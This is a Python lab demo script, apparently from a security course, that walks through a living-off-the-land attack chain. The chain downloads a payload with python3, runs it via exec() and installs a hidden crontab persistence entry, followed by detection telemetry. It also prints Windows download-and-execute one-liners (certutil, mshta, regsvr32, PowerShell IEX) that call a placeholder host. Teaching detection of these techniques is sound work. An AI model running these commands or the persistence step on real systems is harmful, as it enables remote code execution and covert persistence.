#!/usr/bin/env python3
"""
Linux LOLBins (Living off the Land) demo — lab app server.

Demonstrates a full LOLBin chain using ONLY native binaries:
  Step 1 — Download cradle: python3 + urllib (no curl/wget needed)
  Step 2 — Execution: python3 -c exec() through a trusted interpreter
  Step 3 — Persistence: crontab via bash heredoc
  Step 4 — Detection: what telemetry reveals despite using "trusted" binaries

GTFOBins reference: https://gtfobins.github.io/
LOLBAS (Windows): https://lolbas-project.github.io/

The concept: security tools often allow-list "trusted" binaries (python, bash,
curl) and block only known-malicious executables. LOLBins abuse the trust given
to native tools to carry out attacker objectives. Detection must focus on
BEHAVIOUR (what the binary is doing) not the binary name alone.

> Only use LOLBins on systems you own or have explicit written authorisation to test.

Usage:
    python3 lolbins_demo.py
"""
from __future__ import annotations

import os
import socket
import subprocess
import sys
import tempfile
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

DIVIDER = "─" * 64
PAYLOAD_PATH = Path(__file__).parent / "payload" / "stage2.py"
PAYLOAD_PORT = 8765
PAYLOAD_URL  = f"http://127.0.0.1:{PAYLOAD_PORT}/stage2.py"
DROP_PATH    = "/tmp/.sysupdate"


class PayloadHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        content = PAYLOAD_PATH.read_bytes()
        self.send_response(200)
        self.send_header("Content-Type", "text/x-python")
        self.send_header("Content-Length", str(len(content)))
        self.end_headers()
        self.wfile.write(content)

    def log_message(self, *args) -> None:
        pass


def start_payload_server() -> HTTPServer:
    srv = HTTPServer(("127.0.0.1", PAYLOAD_PORT), PayloadHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    time.sleep(0.05)
    return srv


def run(cmd: str, **kw) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, shell=True, capture_output=True, text=True, **kw)


def demo() -> int:
    print("=" * 64)
    print("Lab app server — LOLBins Demo")
    print("Technique: download cradle → exec → persistence via native binaries")
    print("=" * 64)

    # ── Baseline: what binaries are available? ─────────────────────────────
    print("\n[Recon] Native binaries available on this host")
    print()
    lolbins = [
        ("python3",   "download, exec, revshell (GTFOBins)"),
        ("bash",      "exec, revshell, file write, SUID escalation"),
        ("curl",      "download, exfil, SSRF pivot"),
        ("wget",      "download"),
        ("crontab",   "persistence (cron job)"),
        ("sh",        "exec, revshell"),
        ("env",       "SUID escape, exec"),
        ("find",      "SUID escalation (module 10)"),
    ]
    print(f"  {'Binary':<12}  Present  GTFOBins use case")
    print(f"  {'─'*12}  {'─'*7}  {'─'*35}")
    for binary, use in lolbins:
        r = run(f"which {binary}")
        present = "✓" if r.returncode == 0 else "✗"
        path = r.stdout.strip() or ""
        print(f"  {binary:<12}  {present}        {use}")

    # ── Step 1: Download cradle ────────────────────────────────────────────
    print(f"\n{DIVIDER}")
    print("[Step 1] Download cradle — fetch payload using python3 + urllib")
    print()
    srv = start_payload_server()

    download_cmd = (
        f"python3 -c \""
        f"import urllib.request; "
        f"open('{DROP_PATH}', 'wb').write("
        f"urllib.request.urlopen('{PAYLOAD_URL}').read())\""
    )
    print(f"  Command (native python3 only, no curl):")
    print(f"    {download_cmd[:80]}...")
    print()
    r = run(download_cmd)
    if r.returncode == 0 and Path(DROP_PATH).exists():
        size = Path(DROP_PATH).stat().st_size
        print(f"  ✓ Payload dropped to {DROP_PATH}  ({size} bytes)")
    else:
        print(f"  ✗ Download failed: {r.stderr[:100]}")

    # ── Step 2: Execute via trusted interpreter ───────────────────────────
    print(f"\n{DIVIDER}")
    print("[Step 2] Execution — run payload through python3 (trusted interpreter)")
    print()
    exec_cmd = f"python3 -c \"exec(open('{DROP_PATH}').read())\""
    print(f"  Command:")
    print(f"    {exec_cmd}")
    print()
    r = run(exec_cmd)
    for line in r.stdout.splitlines():
        print(f"  {line}")
    print()
    print("  The payload ran through 'python3' — a trusted binary in most allow-lists.")
    print("  EDR signatures on 'python3' alone won't catch this; behaviour detection will.")

    # ── Step 3: Persistence via crontab ───────────────────────────────────
    print(f"\n{DIVIDER}")
    print("[Step 3] Persistence — cron job via crontab (native)")
    print()
    persist_cmd = f"(crontab -l 2>/dev/null; echo '@reboot python3 {DROP_PATH}') | crontab -"
    print(f"  Command:")
    print(f"    {persist_cmd}")
    r = run(persist_cmd)
    verify = run("crontab -l 2>/dev/null")
    if DROP_PATH in verify.stdout:
        print(f"\n  ✓ Crontab entry added:")
        for line in verify.stdout.splitlines():
            if DROP_PATH in line or "sysupdate" in line.lower():
                print(f"    {line}")
    else:
        print(f"  crontab output: {verify.stdout.strip() or '(empty)'}")

    # ── Step 4: Detection artifacts ───────────────────────────────────────
    print(f"\n{DIVIDER}")
    print("[Step 4] Detection — what telemetry reveals despite using native binaries")
    print()
    print("  The LOLBin technique evades SIMPLE signature-based tools.")
    print("  Behavioural detections still catch it:\n")
    rows = [
        ("auditd / Sysmon",    "python3 opening a network socket (SOCK_STREAM to 127.0.0.1)"),
        ("auditd / Sysmon",    "python3 writing to /tmp/.sysupdate (unusual path + hidden)"),
        ("auditd / Sysmon",    "python3 reading + executing file in /tmp (exec(open(...)))"),
        ("osquery",            "SELECT * FROM crontab WHERE command LIKE '%/tmp%' — flags /tmp payload"),
        ("Falco",              "Spawned process inheriting interpreter (python→python chain)"),
        ("EDR (behaviour)",    "python3 child of unusual parent, writing to hidden /tmp path"),
    ]
    for tool, artifact in rows:
        print(f"  {tool:<22}  {artifact}")

    print()
    print("  Key insight: LOLBins defeat SIGNATURE detection (block the binary name).")
    print("  They do NOT defeat BEHAVIOUR detection (what the binary is doing).")
    print("  Defenders who log process ancestry, file writes, and network calls catch it.")

    # ── Step 5: Windows LOLBins note ─────────────────────────────────────
    print(f"\n{DIVIDER}")
    print("[Step 5] Windows LOLBins (LOLBAS) — documented, not containerised")
    print()
    print("  Windows requires a VM (see module 11-privesc-windows for setup).")
    print("  Classic LOLBAS download + exec chains:")
    windows_lolbins = [
        ("certutil",    "certutil -urlcache -split -f http://<IP>/shell.exe shell.exe"),
        ("bitsadmin",   "bitsadmin /transfer job /download /priority normal http://<IP>/shell.exe C:\\\\shell.exe"),
        ("mshta",       "mshta.exe http://<IP>/payload.hta  (executes HTA — HTML Application)"),
        ("regsvr32",    "regsvr32 /s /n /u /i:http://<IP>/payload.sct scrobj.dll"),
        ("powershell",  "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1')"),
        ("wscript",     "wscript //E:jscript C:\\\\Users\\\\Public\\\\payload.js"),
    ]
    for binary, cmd in windows_lolbins:
        print(f"  {binary:<12}  {cmd}")
    print()
    print("  Full catalog: https://lolbas-project.github.io/")

    print(f"\n{'=' * 64}")
    print("Demo complete — LOLBin chain: download → exec → persist → detect")
    print(f"{'=' * 64}\n")
    srv.shutdown()
    return 0


if __name__ == "__main__":
    sys.exit(demo())
